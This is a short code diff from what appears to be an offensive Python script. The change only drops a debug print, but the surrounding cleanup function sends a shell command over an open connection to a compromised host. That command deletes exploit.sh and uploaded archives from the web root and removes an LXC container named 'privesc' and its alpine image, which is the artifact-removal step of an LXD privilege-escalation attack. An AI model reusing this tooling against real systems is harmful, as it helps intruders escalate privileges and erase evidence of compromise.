@@ -228,7 +228,6 @@ def recvall(sock):
 
 def cleanup(conn, file_name, general_info, rep):
 	script_dir = os.path.dirname(os.path.realpath(__file__))
-	print('Rep: ', rep, 'Dir: ', script_dir)
 	conn.send('''cd $(grep -e DocumentRoot -R /etc/apache2/sites-enabled/ | awk '{ print $3 }') && rm -f *.tar.gz exploit.sh; lxc stop privesc && lxc delete privesc && lxc image delete alpine;\n'''.encode())
 	
 	# Only delete local files if it's the last repetition
